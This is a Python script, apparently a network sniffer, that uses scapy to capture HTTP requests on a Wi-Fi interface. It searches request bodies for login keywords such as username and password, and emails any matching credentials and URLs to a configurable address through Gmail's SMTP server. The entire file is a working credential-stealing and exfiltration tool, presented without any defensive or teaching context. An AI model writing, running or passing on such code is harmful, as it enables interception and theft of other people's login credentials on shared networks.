import scapy.all as scapy
from scapy.layers import http
import smtplib, ssl


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load 
        keywords = ["username", "user", "login", "password", "pass","name","E-Mail"]
        for keyword in keywords:
            if keyword in load.decode("utf-8"):
                return load
            
def send_email(url, login_info):
    port = 587  # SMTP port
    smtp_server = "smtp.gmail.com"  # SMTP server address
    sender_email = ""  # Sender's email address
    receiver_email = ""  # Recipient's email address
    password = ""  # Sender's email password or app-specific code
    message = f"Subject: Login Information\n\nURL: {url}\nLogin info: {login_info}"
    
    # Create a secure SSL context
    context = ssl.create_default_context()

    # Try to send the email
    with smtplib.SMTP(smtp_server, port) as server:
        server.starttls(context=context)
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)
        print("Email sent")

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >>" + url.decode("utf-8"))

        login_info = get_login_info(packet)
        if login_info:
            print("Sending email...")
            print("URL: ", url)
            print("Login info: ", login_info)
            send_email(url, login_info)
sniff("Wi-Fi")